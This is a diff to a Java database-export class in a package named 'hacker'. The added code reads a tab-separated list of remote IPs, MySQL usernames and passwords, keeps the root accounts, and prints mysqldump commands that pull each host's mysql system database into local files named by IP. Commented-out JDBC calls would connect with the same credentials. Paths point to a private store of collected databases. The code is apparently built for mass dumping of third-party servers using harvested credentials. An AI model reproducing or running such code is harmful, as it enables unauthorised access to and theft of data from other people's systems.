@@ -9,9 +9,12 @@ import java.sql.PreparedStatement;
 import java.sql.ResultSet;
 import java.sql.ResultSetMetaData;
 import java.sql.SQLException;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.Properties;
 
 import com.mtx.xiatian.evolvedata.MyThreadPoolExecutor;
+import com.mtx.xiatian.hacker.GetOracleDB;
 import com.mtx.xiatian.hacker.InfoLog;
 
 /**
@@ -24,7 +27,7 @@ public class Db2sql
 
 	public static boolean useText = false;
 	
-	public static String path = "./data/";// "/Volumes/dbdata/sgkzl/MTX私有/QQ/";
+	public static String path = "/Volumes/dbdata/sgkzl/MTX私有/mysql/";// "./data/";// 
 
 	/**
 	 * 去除后面的数字
@@ -41,18 +44,19 @@ public class Db2sql
 	{
 		String driverClassName = props.getProperty("driver.class");
 		String driverURL = props.getProperty("driver.url");
+		String ip = driverURL.replaceAll("(^.*?\\//)|(:.*?$)", "") + "_";
 		String catalogName = props.getProperty("user");
 		String outCatalogName = null;
 		// 启用高速，则数据写入固态硬盘，完事后移动到移动硬盘上
 		boolean bUseGs = false;
-		File f1 = new File(outCatalogName = path + catalogName + ".sql");
+		File f1 = new File(outCatalogName = path + ip + catalogName + ".sql");
 		if (f1.exists()) {
 			f1.delete();
 			// return "";
 			// f1.renameTo(new File(path + catalogName +
 			// "_" + System.nanoTime() + ".sql"));
 		}
-		outCatalogName = path + catalogName + ".sql";
+		outCatalogName = path + ip + catalogName + ".sql";
 		OutputStream bos = null;
 		if (bUseGs) {
 			outCatalogName = "data/" + catalogName + ".sql";
@@ -105,7 +109,7 @@ public class Db2sql
 								+ tables + "没有找到任何符合要求的对象");
 				rs.close();
 			} else {
-				outCatalogName = path + catalogName + ".sql";
+				outCatalogName = path  + ip+ catalogName + ".sql";
 				f1 = new File(outCatalogName);
 				if (f1.exists())
 					return "";
@@ -556,6 +560,42 @@ public class Db2sql
 		
 		if(true)
 		{
+			String []aMysql = InfoLog.getFile(new File("/Users/xiatian/safe/tianxiamtx/javacode/hackertools/com/mtx/xiatian/expimp/gsMySql.txt")).split("\\n");
+			String []aL;
+			String szPswd = "", szDB;
+			Map <String,String> mIp = new HashMap <String,String>();
+			for(String L: aMysql)
+			{
+				if(-1 < L.indexOf("ftp") || -1 < L.indexOf("proxy"))continue;
+				aL = L.split("\\t");
+				if(mIp.containsKey(aL[0]))continue;
+				if(5 > aL.length)
+				{
+					System.out.println(L);
+					szPswd = "";
+				}
+				else szPswd = aL[4].trim();
+				if(0 == aL[3].trim().length())aL[3] = "root";
+				szDB = aL[3];
+				if(!"root".equals(aL[3]))continue;
+//				if("root".equals(aL[3]))continue;
+				mIp.put( aL[0] , "");
+				if("root".equals(aL[3]))szDB = "mysql";
+//				System.out.println("start: " + aL[0] + ": :: " + aL[3] + " -- " + szPswd);
+				System.out.println("mysqldump -P 3306 -h " + aL[0] + " -u " +  aL[3] + " --default-character-set=utf8 -p " + szDB + " > " + aL[0] + "_" +  szDB + ".sql");
+				
+//				GetOracleDB.main1("com.mysql.jdbc.Driver", "jdbc:mysql://" + aL[0] + ":3306/" + szDB + "?relaxAutoCommit=true&useUnicode=true&characterEncoding=utf8", aL[3], szPswd);
+//				main1("com.mysql.jdbc.Driver", "jdbc:mysql://" + aL[0] + ":3306/" + szDB + "?relaxAutoCommit=true&useUnicode=true&characterEncoding=utf8", aL[3], szPswd);
+				if(0 < aL[1].trim().length()  && !aL[1].trim().equals(aL[0]))
+				{
+//					System.out.println("start: " + aL[1] + ": :: " + aL[3] + " -- " + aL[4]);
+//					main1("com.mysql.jdbc.Driver", "jdbc:mysql://" + aL[1].trim() + ":3306/" + szDB + "?relaxAutoCommit=true&useUnicode=true&characterEncoding=utf8", aL[3], szPswd);
+//					GetOracleDB.main1("com.mysql.jdbc.Driver", "jdbc:mysql://" + aL[1].trim() + ":3306/" + szDB + "?relaxAutoCommit=true&useUnicode=true&characterEncoding=utf8", aL[3], szPswd);
+					System.out.println("mysqldump -P 3306 -h " + aL[1] + " -u " +  aL[3] + " --default-character-set=utf8 -p " + szDB + " > " + aL[1] + "_" +  szDB + ".sql");
+				}
+			}
+//			main1("jdbc:mysql://127.0.0.1:3306/mydb?relaxAutoCommit=true&useUnicode=true&characterEncoding=utf8", "root", "root");
+			
 //			 main1("oracle.jdbc.driver.OracleDriver",
 //					 "jdbc:oracle:thin:@192.168.24.18:1521:orcl", "yhomsmp", "yhomsmp");
 //			 
@@ -563,8 +603,8 @@ public class Db2sql
 //					 "jdbc:postgresql://127.0.0.1:5433/msf", "msf",
 //                     "miracle***");
 			 
-			 main1("org.sqlite.JDBC",
-					 "jdbc:sqlite:/Volumes/dbdata/sgkzl/MTX私有/收集的db/openvas/tasks.db", "tasks", "");
+//			 main1("org.sqlite.JDBC",
+//					 "jdbc:sqlite:/Volumes/dbdata/sgkzl/MTX私有/收集的db/openvas/tasks.db", "tasks", "");
 //			int i = 1;
 //			for( i = 1; i < 12; i++)
 //			{
